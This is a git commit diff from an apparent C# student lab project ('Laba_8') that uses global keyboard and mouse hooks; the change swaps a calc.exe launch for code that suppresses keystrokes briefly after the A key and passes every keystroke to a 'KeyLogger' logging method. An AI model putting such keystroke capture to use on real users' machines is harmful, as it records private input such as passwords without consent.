a2d66d4e9e986c7c232592d58c41d93fc6479da1
[Dmitry Apanasik] <[dmitry.apanasik@gmail.com]>
2017-12-17 22:24:02 +0300

    last version

--- GlobalHooks.cs
+++ GlobalHooks.cs
@@ -1,6 +1,9 @@
 ﻿using Gma.System.MouseKeyHook;
 using System.Windows.Forms;
 using System.Diagnostics;
+//using System.Timers;
+using System.Threading;
+using System;
 
 namespace Laba_8
 {
@@ -12,6 +15,7 @@ namespace Laba_8
         private readonly Logger _logger;
         private readonly Settings _settings;
         private readonly WindowShowHandler _windowShow;
+        private readonly Stopwatch _tick;
 
         public GlobalHooks(Settings config, WindowShowHandler windowShow)
         {
@@ -20,16 +24,27 @@ namespace Laba_8
             _logger = new Logger(_settings);
             _globalHooks.KeyDown += KeyEvent;
             _globalHooks.MouseClick += MouseEvent;
+            _tick = new Stopwatch();
         }
-
         private void KeyEvent(object sender, KeyEventArgs e)
         {
             if (_settings.IsHooks)
             {
-                if (e.KeyData == (Keys.Shift | Keys.Tab))
+                if (e.KeyData == (Keys.A))
                 {
-                    Process.Start("calc.exe");
+                    _tick.Restart();
                 }
+
+                if (_tick.IsRunning && _tick.Elapsed.Seconds < 2)
+                {
+                    e.SuppressKeyPress = true;
+                }
+
+                if (_tick.IsRunning && _tick.Elapsed.Seconds > 2)
+                {
+                    _tick.Stop();
+                }
+
                 _logger.KeyLogger(e.KeyData.ToString());
             }
             if (e.KeyData == (Keys.Control | Keys.Shift | Keys.Tab))
